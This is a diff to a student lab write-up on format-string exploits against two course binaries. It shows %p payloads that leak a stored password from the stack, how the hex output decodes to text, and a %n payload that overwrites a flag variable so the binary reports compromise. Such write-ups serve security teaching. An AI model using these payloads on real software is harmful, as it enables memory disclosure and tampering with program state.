@@ -12,13 +12,26 @@ $ ./flag < payload2.exp
 ```
 
 ## *Problem 1*
+* Password : thispasswordisleakedfromstack
 * As mentioned the neccessary bytes are present on the stack thus we make a payload which just prints on the stack information.
-* Payload used:
+* *payload1.exp* has 3 lines for username, password, and last exit line.
+* Password line has the payload
+* Initial payload used:
 ```
 payload = b"%p."*11 + b"\n"
 ```
-* *payload1.exp* has 3 lines for username, password, and last exit line.
-* Password line has the payload
+* From the output we see that we have possible alphanumeric values from the 8th element and the next 3 elements on the stack.
+* Now we run with the given payload and get the values:
+```
+payload = b"%8$p." + b"%9$p." + b"%10$p." + b"%11$p."
+Output:
+0x7373617073696874.0x656c736964726f77.0x6d6f726664656b61.0x6b63617473.
+```
+* On converting the values to appropriate alphanumeric values we obtain : *thispasswordisleakedfromstack*
+* This is the password for the server and on running gives a welcome to lab message.
+
+<div style="page-break-before:always"></div>
+
 
 
 ## *Problem 2*
@@ -33,7 +46,7 @@ Your input:
 AAAA|f7fa35ee.804821c.80484cd.f7fcdb8c.1.f7f916a0.41414141.252e7825.78252e78.2e78252e.
 flag = 0
 ```
-* We get the position of the buffer as 7th position from %esp.
+* We get the position of the buffer as 7th position from %esp seeing the 41 value representing 'A'.
 * We need to place the address of given flag in the buffer.
 * To find it we access objdump of flag and in main we find a *cmp* of eax with 100(0x64).
 ```
@@ -58,6 +71,8 @@ payload += b"%96x" + b"%7$n"
 ```
 ./flag < payload2.exp
 ```
+<div style="page-break-before:always"></div>
+
 * We get output :
 ```
 Your input:
@@ -65,5 +80,12 @@ Your input:
 flag = 100
 
 The system is compromised
-```
+```  
+--------
+* CS20B021 Chathurvedhi Talapaneni
+* CS20B084 Aditya Vaichalkar
+
+
+
+
 
